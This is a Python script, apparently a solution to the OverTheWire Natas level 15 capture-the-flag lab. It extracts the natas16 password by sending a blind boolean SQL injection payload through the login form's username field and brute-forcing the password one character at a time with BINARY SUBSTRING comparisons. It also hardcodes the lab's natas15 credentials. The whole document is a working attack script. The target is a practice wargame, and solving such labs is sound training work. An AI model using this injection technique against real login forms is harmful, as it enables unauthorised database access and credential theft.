#!/usr/bin/env python3

import requests
import string

subset = string.ascii_letters + string.digits
natas15_pw = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
natas16_pw = ''

for i in range(len(natas15_pw)):
    for character in subset:
        query = 'natas16" AND BINARY SUBSTRING(password, ' + str(i + 1) + ', 1)="' + character
        r = requests.post('http://natas15.natas.labs.overthewire.org/', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data={'username':query})

        if "doesn't" not in r.text:
            print('iteration: ' + str(i))
            natas16_pw += character
            print('current pass: ' + natas16_pw)
            break

print('natas16: ' + natas16_pw)